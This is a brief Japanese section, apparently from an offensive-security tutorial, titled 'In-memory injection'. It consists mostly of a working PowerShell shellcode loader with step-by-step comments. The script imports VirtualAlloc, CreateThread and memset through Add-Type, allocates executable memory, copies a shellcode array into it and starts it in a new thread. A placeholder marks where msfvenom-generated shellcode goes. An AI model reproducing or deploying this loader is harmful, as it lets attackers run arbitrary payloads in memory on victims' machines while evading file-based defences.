### 2. メモリ内インジェクション
1. Powershellスクリプトの生成
```powershell
#  kernel32.dll からVirtualAlloc と CreateThread 、そしてmsvcrt.dllからmemsetをインポートすることから始まります。これらの関数は、それぞれメモリの割り当て、実行スレッドの作成、そして割り当てられたメモリへの任意のデータの書き込みを可能にします。ここでも、メモリの割り当てと新しいスレッドの実行は、リモートプロセスではなく、現在のプロセス（powershell.exe）内で行われていることに注意してください。
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

# 最後のステップとして、メモリ内に書き込まれたペイロードは、CreateThread API を使用して別のスレッドで実行されます。
$winFunc = 
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

# スクリプトのメイン ロジックは、 VirtualAllocを使用してメモリ ブロックを割り当てることから始まります 。VirtualAlloc は、 $scバイト配列に格納されているペイロードの各バイトを取得し 、 memsetを使用して新しく割り当てられたメモリ ブロックに書き込みます。
[Byte[]];
[Byte[]]$sc = <place your shellcode here>; # ここにmsfvenomで生成したペイロードを貼り付ける

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```
